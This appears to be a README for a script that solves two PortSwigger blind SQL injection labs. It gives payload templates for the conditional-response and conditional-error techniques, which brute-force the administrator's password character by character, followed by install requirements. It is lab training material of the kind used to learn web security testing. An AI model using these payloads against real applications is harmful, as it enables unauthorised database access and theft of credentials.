# SQL Injection PortSwigger Labs
The script gets the password length and execute a bruteforce attack to the web.
- Lab: Blind SQL injection with conditional responses
```sql
'and (select substring(password, %d, 1) from users where username = 'administrator') = '%s
```
- Lab: Blind SQL injection with conditional errors
```sql
'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

## Requirements
- pwntools
- request

All the requirements can be installed from requirements.txt file executing this on terminal:
```bash
pip3 install -r requirements.txt
```
## To-Do
- Get pass length on coditional error attack